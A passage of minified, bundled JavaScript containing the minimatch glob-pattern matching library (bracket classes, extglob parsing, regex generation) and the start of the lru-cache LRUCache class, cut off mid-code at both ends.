j=X.charAt(z);if((j==="!"||j==="^")&&z===Q+1){K=!0,z++;continue}if(j==="]"&&G&&!U){V=z+1;break}if(G=!0,j==="\\"){if(!U){U=!0,z++;continue}}if(j==="["&&!U){for(let[O,[N,A,D]]of Object.entries(ay1))if(X.startsWith(O,z)){if(B)return["$.",!1,X.length-Q,!0];if(z+=O.length,D)W.push(N);else Y.push(N);H=H||A;continue X}}if(U=!1,B){if(j>B)Y.push(jQ(B)+"-"+jQ(j));else if(j===B)Y.push(jQ(j));B="",z++;continue}if(X.startsWith("-]",z+1)){Y.push(jQ(j+"-")),z+=2;continue}if(X.startsWith("-",z+1)){B=j,z+=2;continue}Y.push(jQ(j)),z++}if(V<z)return["",!1,0,!1];if(!Y.length&&!W.length)return["$.",!1,X.length-Q,!0];if(W.length===0&&Y.length===1&&/^\\?.$/.test(Y[0])&&!K){let j=Y[0].length===2?Y[0].slice(-1):Y[0];return[sy1(j),!1,V-Q,!1]}let Z="["+(K?"^":"")+bL(Y)+"]",M="["+(K?"":"^")+bL(W)+"]";return[Y.length&&W.length?"("+Z+"|"+M+")":Y.length?Z:M,H,V-Q,!0]};var xL=j1(()=>{ay1={"[:alnum:]":["\\p{L}\\p{Nl}\\p{Nd}",!0],"[:alpha:]":["\\p{L}\\p{Nl}",!0],"[:ascii:]":["\\x00-\\x7f",!1],"[:blank:]":["\\p{Zs}\\t",!0],"[:cntrl:]":["\\p{Cc}",!0],"[:digit:]":["\\p{Nd}",!0],"[:graph:]":["\\p{Z}\\p{C}",!0,!0],"[:lower:]":["\\p{Ll}",!0],"[:print:]":["\\p{C}",!0],"[:punct:]":["\\p{P}",!0],"[:space:]":["\\p{Z}\\t\\r\\n\\v\\f",!0],"[:upper:]":["\\p{Lu}",!0],"[:word:]":["\\p{L}\\p{Nl}\\p{Nd}\\p{Pc}",!0],"[:xdigit:]":["A-Fa-f0-9",!1]}});var x8=(X,{windowsPathsNoEscape:J=!1}={})=>{return J?X.replace(/\[([^\/\\])\]/g,"$1"):X.replace(/((?!\\).|^)\[([^\/\\])\]/g,"$1$2").replace(/\\([^\/])/g,"$1")};class q9{type;#X;#J;#G=!1;#W=[];#z;#N;#R;#V=!1;#H;#q;#B=!1;constructor(X,J,Q={}){if(this.type=X,X)this.#J=!0;if(this.#z=J,this.#X=this.#z?this.#z.#X:this,this.#H=this.#X===this?Q:this.#X.#H,this.#R=this.#X===this?[]:this.#X.#R,X==="!"&&!this.#X.#V)this.#R.push(this);this.#N=this.#z?this.#z.#W.length:0}get hasMagic(){if(this.#J!==void 0)return this.#J;for(let X of this.#W){if(typeof X==="string")continue;if(X.type||X.hasMagic)return this.#J=!0}return this.#J}toString(){if(this.#q!==void 0)return this.#q;if(!this.type)return this.#q=this.#W.map((X)=>String(X)).join("");else return this.#q=this.type+"("+this.#W.map((X)=>String(X)).join("|")+")"}#U(){if(this!==this.#X)throw new Error("should only call on root");if(this.#V)return this;this.toString(),this.#V=!0;let X;while(X=this.#R.pop()){if(X.type!=="!")continue;let J=X,Q=J.#z;while(Q){for(let Y=J.#N+1;!Q.type&&Y<Q.#W.length;Y++)for(let W of X.#W){if(typeof W==="string")throw new Error("string part in extglob AST??");W.copyIn(Q.#W[Y])}J=Q,Q=J.#z}}return this}push(...X){for(let J of X){if(J==="")continue;if(typeof J!=="string"&&!(J instanceof q9&&J.#z===this))throw new Error("invalid part: "+J);this.#W.push(J)}}toJSON(){let X=this.type===null?this.#W.slice().map((J)=>typeof J==="string"?J:J.toJSON()):[this.type,...this.#W.map((J)=>J.toJSON())];if(this.isStart()&&!this.type)X.unshift([]);if(this.isEnd()&&(this===this.#X||this.#X.#V&&this.#z?.type==="!"))X.push({});return X}isStart(){if(this.#X===this)return!0;if(!this.#z?.isStart())return!1;if(this.#N===0)return!0;let X=this.#z;for(let J=0;J<this.#N;J++){let Q=X.#W[J];if(!(Q instanceof q9&&Q.type==="!"))return!1}return!0}isEnd(){if(this.#X===this)return!0;if(this.#z?.type==="!")return!0;if(!this.#z?.isEnd())return!1;if(!this.type)return this.#z?.isEnd();let X=this.#z?this.#z.#W.length:0;return this.#N===X-1}copyIn(X){if(typeof X==="string")this.push(X);else this.push(X.clone(this))}clone(X){let J=new q9(this.type,X);for(let Q of this.#W)J.copyIn(Q);return J}static#Q(X,J,Q,Y){let W=!1,z=!1,G=-1,H=!1;if(J.type===null){let Z=Q,M="";while(Z<X.length){let F=X.charAt(Z++);if(W||F==="\\"){W=!W,M+=F;continue}if(z){if(Z===G+1){if(F==="^"||F==="!")H=!0}else if(F==="]"&&!(Z===G+2&&H))z=!1;M+=F;continue}else if(F==="["){z=!0,G=Z,H=!1,M+=F;continue}if(!Y.noext&&fL(F)&&X.charAt(Z)==="("){J.push(M),M="";let j=new q9(F,J);Z=q9.#Q(X,j,Z,Y),J.push(j);continue}M+=F}return J.push(M),Z}let U=Q+1,K=new q9(null,J),V=[],B="";while(U<X.length){let Z=X.charAt(U++);if(W||Z==="\\"){W=!W,B+=Z;continue}if(z){if(U===G+1){if(Z==="^"||Z==="!")H=!0}else if(Z==="]"&&!(U===G+2&&H))z=!1;B+=Z;continue}else if(Z==="["){z=!0,G=U,H=!1,B+=Z;continue}if(fL(Z)&&X.charAt(U)==="("){K.push(B),B="";let M=new q9(Z,K);K.push(M),U=q9.#Q(X,M,U,Y);continue}if(Z==="|"){K.push(B),B="",V.push(K),K=new q9(null,J);continue}if(Z===")"){if(B===""&&J.#W.length===0)J.#B=!0;return K.push(B),B="",J.push(...V,K),U}B+=Z}return J.type=null,J.#J=void 0,J.#W=[X.substring(Q-1)],U}static fromGlob(X,J={}){let Q=new q9(null,void 0,J);return q9.#Q(X,Q,0,J),Q}toMMPattern(){if(this!==this.#X)return this.#X.toMMPattern();let X=this.toString(),[J,Q,Y,W]=this.toRegExpSource();if(!(Y||this.#J||this.#H.nocase&&!this.#H.nocaseMagicOnly&&X.toUpperCase()!==X.toLowerCase()))return Q;let G=(this.#H.nocase?"i":"")+(W?"u":"");return Object.assign(new RegExp(`^${J}$`,G),{_src:J,_glob:X})}get options(){return this.#H}toRegExpSource(X){let J=X??!!this.#H.dot;if(this.#X===this)this.#U();if(!this.type){let H=this.isStart()&&this.isEnd(),U=this.#W.map((Z)=>{let[M,F,j,O]=typeof Z==="string"?q9.#L(Z,this.#J,H):Z.toRegExpSource(X);return this.#J=this.#J||j,this.#G=this.#G||O,M}).join(""),K="";if(this.isStart()){if(typeof this.#W[0]==="string"){if(!(this.#W.length===1&&Xm1.has(this.#W[0]))){let M=ey1,F=J&&M.has(U.charAt(0))||U.startsWith("\\.")&&M.has(U.charAt(2))||U.startsWith("\\.\\.")&&M.has(U.charAt(4)),j=!J&&!X&&M.has(U.charAt(0));K=F?ty1:j?w2:""}}}let V="";if(this.isEnd()&&this.#X.#V&&this.#z?.type==="!")V="(?:$|\\/)";return[K+U+V,x8(U),this.#J=!!this.#J,this.#G]}let Q=this.type==="*"||this.type==="+",Y=this.type==="!"?"(?:(?!(?:":"(?:",W=this.#M(J);if(this.isStart()&&this.isEnd()&&!W&&this.type!=="!"){let H=this.toString();return this.#W=[H],this.type=null,this.#J=void 0,[H,x8(this.toString()),!1,!1]}let z=!Q||X||J||!w2?"":this.#M(!0);if(z===W)z="";if(z)W=`(?:${W})(?:${z})*?`;let G="";if(this.type==="!"&&this.#B)G=(this.isStart()&&!J?w2:"")+hL;else{let H=this.type==="!"?"))"+(this.isStart()&&!J&&!X?w2:"")+gL+")":this.type==="@"?")":this.type==="?"?")?":this.type==="+"&&z?")":this.type==="*"&&z?")?":`)${this.type}`;G=Y+W+H}return[G,x8(W),this.#J=!!this.#J,this.#G]}#M(X){return this.#W.map((J)=>{if(typeof J==="string")throw new Error("string type in extglob ast??");let[Q,Y,W,z]=J.toRegExpSource(X);return this.#G=this.#G||z,Q}).filter((J)=>!(this.isStart()&&this.isEnd())||!!J).join("|")}static#L(X,J,Q=!1){let Y=!1,W="",z=!1;for(let G=0;G<X.length;G++){let H=X.charAt(G);if(Y){Y=!1,W+=(Jm1.has(H)?"\\":"")+H;continue}if(H==="\\"){if(G===X.length-1)W+="\\\\";else Y=!0;continue}if(H==="["){let[U,K,V,B]=vL(X,G);if(V){W+=U,z=z||K,G+=V-1,J=J||B;continue}}if(H==="*"){if(Q&&X==="*")W+=hL;else W+=gL;J=!0;continue}if(H==="?"){W+=_H,J=!0;continue}W+=Qm1(H)}return[W,x8(X),!!J,z]}}var oy1,fL=(X)=>oy1.has(X),ty1="(?!(?:^|/)\\.\\.?(?:$|/))",w2="(?!\\.)",ey1,Xm1,Jm1,Qm1=(X)=>X.replace(/[-[\]{}()*+?.,\\^$|#\s]/g,"\\$&"),_H="[^/]",gL,hL;var EH=j1(()=>{xL();oy1=new Set(["!","?","+","*","@"]),ey1=new Set(["[","."]),Xm1=new Set(["..","."]),Jm1=new Set("().*{}+?[]^$\\!"),gL=_H+"*?",hL=_H+"+?"});var I7=(X,{windowsPathsNoEscape:J=!1}={})=>{return J?X.replace(/[?*()[\]]/g,"[$&]"):X.replace(/[?*()[\]\\]/g,"\\$&")};class Z8{options;set;pattern;windowsPathsNoEscape;nonegate;negate;comment;empty;preserveMultipleSlashes;partial;globSet;globParts;nocase;isWindows;platform;windowsNoMagicRoot;regexp;constructor(X,J={}){if(FQ(X),J=J||{},this.options=J,this.pattern=X,this.platform=J.platform||lL,this.isWindows=this.platform==="win32",this.windowsPathsNoEscape=!!J.windowsPathsNoEscape||J.allowWindowsEscape===!1,this.windowsPathsNoEscape)this.pattern=this.pattern.replace(/\\/g,"/");this.preserveMultipleSlashes=!!J.preserveMultipleSlashes,this.regexp=null,this.negate=!1,this.nonegate=!!J.nonegate,this.comment=!1,this.empty=!1,this.partial=!!J.partial,this.nocase=!!this.options.nocase,this.windowsNoMagicRoot=J.windowsNoMagicRoot!==void 0?J.windowsNoMagicRoot:!!(this.isWindows&&this.nocase),this.globSet=[],this.globParts=[],this.set=[],this.make()}hasMagic(){if(this.options.magicalBraces&&this.set.length>1)return!0;for(let X of this.set)for(let J of X)if(typeof J!=="string")return!0;return!1}debug(...X){}make(){let X=this.pattern,J=this.options;if(!J.nocomment&&X.charAt(0)==="#"){this.comment=!0;return}if(!X){this.empty=!0;return}if(this.parseNegate(),this.globSet=[...new Set(this.braceExpand())],J.debug)this.debug=(...W)=>console.error(...W);this.debug(this.pattern,this.globSet);let Q=this.globSet.map((W)=>this.slashSplit(W));this.globParts=this.preprocess(Q),this.debug(this.pattern,this.globParts);let Y=this.globParts.map((W,z,G)=>{if(this.isWindows&&this.windowsNoMagicRoot){let H=W[0]===""&&W[1]===""&&(W[2]==="?"||!mL.test(W[2]))&&!mL.test(W[3]),U=/^[a-z]:/i.test(W[0]);if(H)return[...W.slice(0,4),...W.slice(4).map((K)=>this.parse(K))];else if(U)return[W[0],...W.slice(1).map((K)=>this.parse(K))]}return W.map((H)=>this.parse(H))});if(this.debug(this.pattern,Y),this.set=Y.filter((W)=>W.indexOf(!1)===-1),this.isWindows)for(let W=0;W<this.set.length;W++){let z=this.set[W];if(z[0]===""&&z[1]===""&&this.globParts[W][2]==="?"&&typeof z[3]==="string"&&/^[a-z]:$/i.test(z[3]))z[2]="?"}this.debug(this.pattern,this.set)}preprocess(X){if(this.options.noglobstar){for(let Q=0;Q<X.length;Q++)for(let Y=0;Y<X[Q].length;Y++)if(X[Q][Y]==="**")X[Q][Y]="*"}let{optimizationLevel:J=1}=this.options;if(J>=2)X=this.firstPhasePreProcess(X),X=this.secondPhasePreProcess(X);else if(J>=1)X=this.levelOneOptimize(X);else X=this.adjascentGlobstarOptimize(X);return X}adjascentGlobstarOptimize(X){return X.map((J)=>{let Q=-1;while((Q=J.indexOf("**",Q+1))!==-1){let Y=Q;while(J[Y+1]==="**")Y++;if(Y!==Q)J.splice(Q,Y-Q)}return J})}levelOneOptimize(X){return X.map((J)=>{return J=J.reduce((Q,Y)=>{let W=Q[Q.length-1];if(Y==="**"&&W==="**")return Q;if(Y===".."){if(W&&W!==".."&&W!=="."&&W!=="**")return Q.pop(),Q}return Q.push(Y),Q},[]),J.length===0?[""]:J})}levelTwoFileOptimize(X){if(!Array.isArray(X))X=this.slashSplit(X);let J=!1;do{if(J=!1,!this.preserveMultipleSlashes){for(let Y=1;Y<X.length-1;Y++){let W=X[Y];if(Y===1&&W===""&&X[0]==="")continue;if(W==="."||W==="")J=!0,X.splice(Y,1),Y--}if(X[0]==="."&&X.length===2&&(X[1]==="."||X[1]===""))J=!0,X.pop()}let Q=0;while((Q=X.indexOf("..",Q+1))!==-1){let Y=X[Q-1];if(Y&&Y!=="."&&Y!==".."&&Y!=="**")J=!0,X.splice(Q-1,2),Q-=2}}while(J);return X.length===0?[""]:X}firstPhasePreProcess(X){let J=!1;do{J=!1;for(let Q of X){let Y=-1;while((Y=Q.indexOf("**",Y+1))!==-1){let z=Y;while(Q[z+1]==="**")z++;if(z>Y)Q.splice(Y+1,z-Y);let G=Q[Y+1],H=Q[Y+2],U=Q[Y+3];if(G!=="..")continue;if(!H||H==="."||H===".."||!U||U==="."||U==="..")continue;J=!0,Q.splice(Y,1);let K=Q.slice(0);K[Y]="**",X.push(K),Y--}if(!this.preserveMultipleSlashes){for(let z=1;z<Q.length-1;z++){let G=Q[z];if(z===1&&G===""&&Q[0]==="")continue;if(G==="."||G==="")J=!0,Q.splice(z,1),z--}if(Q[0]==="."&&Q.length===2&&(Q[1]==="."||Q[1]===""))J=!0,Q.pop()}let W=0;while((W=Q.indexOf("..",W+1))!==-1){let z=Q[W-1];if(z&&z!=="."&&z!==".."&&z!=="**"){J=!0;let H=W===1&&Q[W+1]==="**"?["."]:[];if(Q.splice(W-1,2,...H),Q.length===0)Q.push("");W-=2}}}}while(J);return X}secondPhasePreProcess(X){for(let J=0;J<X.length-1;J++)for(let Q=J+1;Q<X.length;Q++){let Y=this.partsMatch(X[J],X[Q],!this.preserveMultipleSlashes);if(Y){X[J]=[],X[Q]=Y;break}}return X.filter((J)=>J.length)}partsMatch(X,J,Q=!1){let Y=0,W=0,z=[],G="";while(Y<X.length&&W<J.length)if(X[Y]===J[W])z.push(G==="b"?J[W]:X[Y]),Y++,W++;else if(Q&&X[Y]==="**"&&J[W]===X[Y+1])z.push(X[Y]),Y++;else if(Q&&J[W]==="**"&&X[Y]===J[W+1])z.push(J[W]),W++;else if(X[Y]==="*"&&J[W]&&(this.options.dot||!J[W].startsWith("."))&&J[W]!=="**"){if(G==="b")return!1;G="a",z.push(X[Y]),Y++,W++}else if(J[W]==="*"&&X[Y]&&(this.options.dot||!X[Y].startsWith("."))&&X[Y]!=="**"){if(G==="a")return!1;G="b",z.push(J[W]),Y++,W++}else return!1;return X.length===J.length&&z}parseNegate(){if(this.nonegate)return;let X=this.pattern,J=!1,Q=0;for(let Y=0;Y<X.length&&X.charAt(Y)==="!";Y++)J=!J,Q++;if(Q)this.pattern=X.slice(Q);this.negate=J}matchOne(X,J,Q=!1){let Y=this.options;if(this.isWindows){let F=typeof X[0]==="string"&&/^[a-z]:$/i.test(X[0]),j=!F&&X[0]===""&&X[1]===""&&X[2]==="?"&&/^[a-z]:$/i.test(X[3]),O=typeof J[0]==="string"&&/^[a-z]:$/i.test(J[0]),N=!O&&J[0]===""&&J[1]===""&&J[2]==="?"&&typeof J[3]==="string"&&/^[a-z]:$/i.test(J[3]),A=j?3:F?0:void 0,D=N?3:O?0:void 0;if(typeof A==="number"&&typeof D==="number"){let[S,$]=[X[A],J[D]];if(S.toLowerCase()===$.toLowerCase()){if(J[D]=S,D>A)J=J.slice(D);else if(A>D)X=X.slice(A)}}}let{optimizationLevel:W=1}=this.options;if(W>=2)X=this.levelTwoFileOptimize(X);this.debug("matchOne",this,{file:X,pattern:J}),this.debug("matchOne",X.length,J.length);for(var z=0,G=0,H=X.length,U=J.length;z<H&&G<U;z++,G++){this.debug("matchOne loop");var K=J[G],V=X[z];if(this.debug(J,K,V),K===!1)return!1;if(K===Z9){this.debug("GLOBSTAR",[J,K,V]);var B=z,Z=G+1;if(Z===U){this.debug("** at the end");for(;z<H;z++)if(X[z]==="."||X[z]===".."||!Y.dot&&X[z].charAt(0)===".")return!1;return!0}while(B<H){var M=X[B];if(this.debug(`
globstar while`,X,B,J,Z,M),this.matchOne(X.slice(B),J.slice(Z),Q))return this.debug("globstar found match!",B,H,M),!0;else{if(M==="."||M===".."||!Y.dot&&M.charAt(0)==="."){this.debug("dot detected!",X,B,J,Z);break}this.debug("globstar swallow a segment, and continue"),B++}}if(Q){if(this.debug(`
>>> no match, partial?`,X,B,J,Z),B===H)return!0}return!1}let F;if(typeof K==="string")F=V===K,this.debug("string match",K,V,F);else F=K.test(V),this.debug("pattern match",K,V,F);if(!F)return!1}if(z===H&&G===U)return!0;else if(z===H)return Q;else if(G===U)return z===H-1&&X[z]==="";else throw new Error("wtf?")}braceExpand(){return pL(this.pattern,this.options)}parse(X){FQ(X);let J=this.options;if(X==="**")return Z9;if(X==="")return"";let Q,Y=null;if(Q=X.match(Zm1))Y=J.dot?Fm1:Mm1;else if(Q=X.match(Ym1))Y=(J.nocase?J.dot?Hm1:zm1:J.dot?Gm1:Wm1)(Q[1]);else if(Q=X.match(jm1))Y=(J.nocase?J.dot?Rm1:Om1:J.dot?Am1:Nm1)(Q);else if(Q=X.match(Um1))Y=J.dot?Vm1:Km1;else if(Q=X.match(Bm1))Y=qm1;let W=q9.fromGlob(X,this.options).toMMPattern();if(Y&&typeof W==="object")Reflect.defineProperty(W,"test",{value:Y});return W}makeRe(){if(this.regexp||this.regexp===!1)return this.regexp;let X=this.set;if(!X.length)return this.regexp=!1,this.regexp;let J=this.options,Q=J.noglobstar?wm1:J.dot?Im1:Cm1,Y=new Set(J.nocase?["i"]:[]),W=X.map((H)=>{let U=H.map((K)=>{if(K instanceof RegExp)for(let V of K.flags.split(""))Y.add(V);return typeof K==="string"?Em1(K):K===Z9?Z9:K._src});return U.forEach((K,V)=>{let B=U[V+1],Z=U[V-1];if(K!==Z9||Z===Z9)return;if(Z===void 0)if(B!==void 0&&B!==Z9)U[V+1]="(?:\\/|"+Q+"\\/)?"+B;else U[V]=Q;else if(B===void 0)U[V-1]=Z+"(?:\\/|"+Q+")?";else if(B!==Z9)U[V-1]=Z+"(?:\\/|\\/"+Q+"\\/)"+B,U[V+1]=Z9}),U.filter((K)=>K!==Z9).join("/")}).join("|"),[z,G]=X.length>1?["(?:",")"]:["",""];if(W="^"+z+W+G+"$",this.negate)W="^(?!"+W+").+$";try{this.regexp=new RegExp(W,[...Y].join(""))}catch(H){this.regexp=!1}return this.regexp}slashSplit(X){if(this.preserveMultipleSlashes)return X.split("/");else if(this.isWindows&&/^\/\/[^\/]+/.test(X))return["",...X.split(/\/+/)];else return X.split(/\/+/)}match(X,J=this.partial){if(this.debug("match",X,this.pattern),this.comment)return!1;if(this.empty)return X==="";if(X==="/"&&J)return!0;let Q=this.options;if(this.isWindows)X=X.split("\\").join("/");let Y=this.slashSplit(X);this.debug(this.pattern,"split",Y);let W=this.set;this.debug(this.pattern,"set",W);let z=Y[Y.length-1];if(!z)for(let G=Y.length-2;!z&&G>=0;G--)z=Y[G];for(let G=0;G<W.length;G++){let H=W[G],U=Y;if(Q.matchBase&&H.length===1)U=[z];if(this.matchOne(U,H,J)){if(Q.flipNegate)return!0;return!this.negate}}if(Q.flipNegate)return!1;return this.negate}static defaults(X){return k9.defaults(X).Minimatch}}var k9=(X,J,Q={})=>{if(FQ(J),!Q.nocomment&&J.charAt(0)==="#")return!1;return new Z8(J,Q).match(X)},Ym1,Wm1=(X)=>(J)=>!J.startsWith(".")&&J.endsWith(X),Gm1=(X)=>(J)=>J.endsWith(X),zm1=(X)=>{return X=X.toLowerCase(),(J)=>!J.startsWith(".")&&J.toLowerCase().endsWith(X)},Hm1=(X)=>{return X=X.toLowerCase(),(J)=>J.toLowerCase().endsWith(X)},Um1,Km1=(X)=>!X.startsWith(".")&&X.includes("."),Vm1=(X)=>X!=="."&&X!==".."&&X.includes("."),Bm1,qm1=(X)=>X!=="."&&X!==".."&&X.startsWith("."),Zm1,Mm1=(X)=>X.length!==0&&!X.startsWith("."),Fm1=(X)=>X.length!==0&&X!=="."&&X!=="..",jm1,Om1=([X,J=""])=>{let Q=uL([X]);if(!J)return Q;return J=J.toLowerCase(),(Y)=>Q(Y)&&Y.toLowerCase().endsWith(J)},Rm1=([X,J=""])=>{let Q=cL([X]);if(!J)return Q;return J=J.toLowerCase(),(Y)=>Q(Y)&&Y.toLowerCase().endsWith(J)},Am1=([X,J=""])=>{let Q=cL([X]);return!J?Q:(Y)=>Q(Y)&&Y.endsWith(J)},Nm1=([X,J=""])=>{let Q=uL([X]);return!J?Q:(Y)=>Q(Y)&&Y.endsWith(J)},uL=([X])=>{let J=X.length;return(Q)=>Q.length===J&&!Q.startsWith(".")},cL=([X])=>{let J=X.length;return(Q)=>Q.length===J&&Q!=="."&&Q!==".."},lL,yL,Lm1,Z9,Dm1="[^/]",wm1,Im1="(?:(?!(?:\\/|^)(?:\\.{1,2})($|\\/)).)*?",Cm1="(?:(?!(?:\\/|^)\\.).)*?",Pm1=(X,J={})=>(Q)=>k9(Q,X,J),q8=(X,J={})=>Object.assign({},X,J),Sm1=(X)=>{if(!X||typeof X!=="object"||!Object.keys(X).length)return k9;let J=k9;return Object.assign((Y,W,z={})=>J(Y,W,q8(X,z)),{Minimatch:class Y extends J.Minimatch{constructor(W,z={}){super(W,q8(X,z))}static defaults(W){return J.defaults(q8(X,W)).Minimatch}},AST:class Y extends J.AST{constructor(W,z,G={}){super(W,z,q8(X,G))}static fromGlob(W,z={}){return J.AST.fromGlob(W,q8(X,z))}},unescape:(Y,W={})=>J.unescape(Y,q8(X,W)),escape:(Y,W={})=>J.escape(Y,q8(X,W)),filter:(Y,W={})=>J.filter(Y,q8(X,W)),defaults:(Y)=>J.defaults(q8(X,Y)),makeRe:(Y,W={})=>J.makeRe(Y,q8(X,W)),braceExpand:(Y,W={})=>J.braceExpand(Y,q8(X,W)),match:(Y,W,z={})=>J.match(Y,W,q8(X,z)),sep:J.sep,GLOBSTAR:Z9})},pL=(X,J={})=>{if(FQ(X),J.nobrace||!/\{(?:(?!\{).)*\}/.test(X))return[X];return $L(X)},Tm1=(X,J={})=>new Z8(X,J).makeRe(),_m1=(X,J,Q={})=>{let Y=new Z8(J,Q);if(X=X.filter((W)=>Y.match(W)),Y.options.nonull&&!X.length)X.push(J);return X},mL,Em1=(X)=>X.replace(/[-[\]{}()*+?.,\\^$|#\s]/g,"\\$&");var UX=j1(()=>{kL();EH();EH();Ym1=/^\*+([^+@!?\*\[\(]*)$/,Um1=/^\*+\.\*+$/,Bm1=/^\.\*+$/,Zm1=/^\*+$/,jm1=/^\?+([^+@!?\*\[\(]*)?$/,lL=typeof process==="object"&&process?typeof process.env==="object"&&process.env&&process.env.__MINIMATCH_TESTING_PLATFORM__||process.platform:"posix",yL={win32:{sep:"\\"},posix:{sep:"/"}},Lm1=lL==="win32"?yL.win32.sep:yL.posix.sep;k9.sep=Lm1;Z9=Symbol("globstar **");k9.GLOBSTAR=Z9;wm1=Dm1+"*?";k9.filter=Pm1;k9.defaults=Sm1;k9.braceExpand=pL;k9.makeRe=Tm1;k9.match=_m1;mL=/[?*]|[+@!]\(.*?\)|\[|\]/;k9.AST=q9;k9.Minimatch=Z8;k9.escape=I7;k9.unescape=x8});class C7{heap;length;static#X=!1;static create(X){let J=nL(X);if(!J)return[];C7.#X=!0;let Q=new C7(X,J);return C7.#X=!1,Q}constructor(X,J){if(!C7.#X)throw new TypeError("instantiate Stack using Stack.create(n)");this.heap=new J(X),this.length=0}push(X){this.heap[this.length++]=X}pop(){return this.heap[--this.length]}}var $m1,iL,$H,rL=(X,J,Q,Y)=>{typeof $H.emitWarning==="function"?$H.emitWarning(X,J,Q,Y):console.error(`[${Q}] ${J}: ${X}`)},I2,dL,km1=(X)=>!iL.has(X),x60,KX=(X)=>X&&X===Math.floor(X)&&X>0&&isFinite(X),nL=(X)=>!KX(X)?null:X<=Math.pow(2,8)?Uint8Array:X<=Math.pow(2,16)?Uint16Array:X<=Math.pow(2,32)?Uint32Array:X<=Number.MAX_SAFE_INTEGER?OQ:null,OQ,RQ;var aL=j1(()=>{$m1=typeof performance==="object"&&performance&&typeof performance.now==="function"?performance:Date,iL=new Set,$H=typeof process==="object"&&!!process?process:{},I2=globalThis.AbortController,dL=globalThis.AbortSignal;if(typeof I2==="undefined"){dL=class Q{onabort;_onabort=[];reason;aborted=!1;addEventListener(Y,W){this._onabort.push(W)}},I2=class Q{constructor(){J()}signal=new dL;abort(Y){if(this.signal.aborted)return;this.signal.reason=Y,this.signal.aborted=!0;for(let W of this.signal._onabort)W(Y);this.signal.onabort?.(Y)}};let X=$H.env?.LRU_CACHE_IGNORE_AC_WARNING!=="1",J=()=>{if(!X)return;X=!1,rL("AbortController is not defined. If using lru-cache in node 14, load an AbortController polyfill from the `node-abort-controller` package. A minimal polyfill is provided for use by LRUCache.fetch(), but it should not be relied upon in other contexts (eg, passing it to other APIs that use AbortController/AbortSignal might have undesirable effects). You may disable this with LRU_CACHE_IGNORE_AC_WARNING=1 in the env.","NO_ABORT_CONTROLLER","ENOTSUP",J)}}x60=Symbol("type");OQ=class OQ extends Array{constructor(X){super(X);this.fill(0)}};RQ=class RQ{#X;#J;#G;#W;#z;#N;#R;#V;get perf(){return this.#V}ttl;ttlResolution;ttlAutopurge;updateAgeOnGet;updateAgeOnHas;allowStale;noDisposeOnSet;noUpdateTTL;maxEntrySize;sizeCalculation;noDeleteOnFetchRejection;noDeleteOnStaleGet;allowStaleOnFetchAbort;allowStaleOnFetchRejection;ignoreFetchAbort;#H;#q;#B;#U;#Q;#M;#L;#A;#F;#T;#j;#w;#P;#O;#D;#S;#Z;#Y;static unsafeExposeInternals(X){return{starts:X.#P,ttls:X.#O,sizes:X.#w,keyMap:X.#B,keyList:X.#U,valList:X.#Q,next:X.#M,prev:X.#L,get head(){return X.#A},get tail(){return X.#F},free:X.#T,isBackgroundFetch:(J)=>X.#K(J),backgroundFetch:(J,Q,Y,W)=>X.#l(J,Q,Y,W),moveToTail:(J)=>X.#g(J),indexes:(J)=>X.#E(J),rindexes:(J)=>X.#k(J),isStale:(J)=>X.#C(J)}}get max(){return this.#X}get maxSize(){return this.#J}get calculatedSize(){return this.#q}get size(){return this.#H}get fetchMethod(){return this.#N}get memoMethod(){return this.#R}get dispose(){return this.#G}get onInsert(){return this.#W}get disposeAfter(){return this.#z}constructor(X){let{max:J=0,ttl:Q,ttlResolution:Y=1,ttlAutopurge:W,updateAgeOnGet:z,updateAgeOnHas:G,allowStale:H,dispose:U,onInsert:K,disposeAfter:V,noDisposeOnSet:B,noUpdateTTL:Z,maxSize:M=0,maxEntrySize:F=0,sizeCalculation:j,fetchMethod:O,memoMethod:N,noDeleteOnFetchRejection:A,noDeleteOnStaleGet:D,allowStaleOnFetchRejection:S,allowStaleOnFetchAbort:$,ignoreFetchAbort:T,perf:k}=X;if(k!==void 0){if(typeof k?.now!=="function")throw new TypeError("perf option must have a now() method if specified")}if(this.#V=k??$m1,J!==0&&!KX(J))throw new TypeError("max option must be a nonnegative integer");let E=J?nL(J):Array;if(!E)throw new Error("invalid max value: "+J);if(this.#X=J,this.#J=M,this.maxEntrySize=F||this.#J,this.sizeCalculation=j,this.sizeCalculation){if(!this.#J&&!this.maxEntrySize)throw new TypeError("cannot set sizeCalculation without setting maxSize or maxEntrySize");if(typeof this.sizeCalculation!=="function")throw new TypeError("sizeCalculation set to non-function")}if(N!==void 0&&typeof N!=="function")throw new TypeError("memoMethod must be a function if defined");if(this.#R=N,O!==void 0&&typeof O!=="function")throw new TypeError("fetchMethod must be a function if specified");if(this.#N=O,this.#S=!!O,this.#B=new Map,this.#U=new Array(J).fill(void 0),this.#Q=new Array(J).fill(void 0),this.#M=new E(J),this.#L=new E(J),this.#A=0,this.#F=0,this.#T=C7.create(J),this.#H=0,this.#q=0,typeof U==="function")this.#G=U;if(typeof K==="function")this.#W=K;if(typeof V==="function")this.#z=V,this.#j=[];else this.#z=void 0,this.#j=void 0;if(this.#D=!!this.#G,this.#Y=!!this.#W,this.#Z=!!this.#z,this.noDisposeOnSet=!!B,this.noUpdateTTL=!!Z,this.noDeleteOnFetchRejection=!!A,this.allowStaleOnFetchRejection=!!S,this.allowStaleOnFetchAbort=!!$,this.ignoreFetchAbort=!!T,this.maxEntrySize!==0){if(this.#J!==0){if(!KX(this.#J))throw new TypeError("maxSize must be a positive integer if specified")}if(!KX(this.maxEntrySize))throw new TypeError("maxEntrySize must be a positive integer if specified");this.#h()}if(this.allowStale=!!H,this.noDeleteOnStaleGet=!!D,this.updateAgeOnGet=!!z,this.updateAgeOnHas=!!G,this.ttlResolution=KX(Y)||Y===0?Y:1,this.ttlAutopurge=!!W,this.ttl=Q||0,this.ttl){if(!KX(this.ttl))throw new TypeError("ttl must be a positive integer if specified");this.#b()}if(this.#X===0&&this.ttl===0&&this.#J===0)throw new TypeError("At least one of max, maxSize, or ttl is required");if(!this.ttlAutopurge&&!this.#X&&!this.#J){if(km1("LRU_CACHE_UNBOUNDED"))iL.add("LRU_CACHE_UNBOUNDED"),rL("TTL caching without ttlAutopurge, max, or maxSize can result in unbounded memory consumption.","UnboundedCacheWarning","LRU_CACHE_UNBOUNDED",RQ)}}getRemainingTTL(X){return this.#B.has(X)?1/0:0}#b(){let X=new OQ(this.#X),J=new OQ(this.#X);this.#O=X,this.#P=J,this.#u=(W,z,G=this.#V.now())=>{if(J[W]=z!==0?G:0,X[W]=z,z!==0&&this.ttlAutopurge){let 